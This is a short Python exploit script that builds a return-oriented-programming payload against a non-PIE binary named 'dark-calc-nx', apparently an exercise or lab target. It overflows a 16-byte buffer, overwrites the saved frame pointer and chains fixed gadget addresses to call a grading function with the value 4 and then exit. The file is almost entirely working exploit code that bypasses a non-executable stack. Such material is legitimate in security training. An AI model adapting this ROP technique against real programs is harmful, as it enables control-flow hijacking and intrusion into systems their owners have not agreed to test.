#!/usr/bin/env python3
"""Task: ROP on attack/dark-calc-nx (NX stack).

The stack is mapped rw-p, so shellcode cannot run.  The binary is a
non-PIE executable, therefore all gadget addresses are fixed.

Gadgets:
    0x4018c7 : ret                 (keeps the 16-byte stack alignment)
    0x401a33 : pop rdi; ret
    0x401978 : grade_eval
    0x4016e0 : exit@plt

Chain: ret -> pop rdi; ret -> 4 -> grade_eval -> pop rdi; ret -> 0 -> exit.
"""

import struct
import sys


def p64(value):
    return struct.pack("<Q", value)


payload = bytearray()
payload += b"A" * 16                    # expression[16]
payload += p64(0x4242424242424242)      # saved rbp
payload += p64(0x4018C7)                # ret (alignment)
payload += p64(0x401A33)                # pop rdi; ret
payload += p64(4)                       # grade = 4
payload += p64(0x401978)                # grade_eval
payload += p64(0x401A33)                # pop rdi; ret
payload += p64(0)                       # exit status
payload += p64(0x4016E0)                # exit@plt

assert len(payload) == 80
assert b"\n" not in payload
sys.stdout.buffer.write(payload)
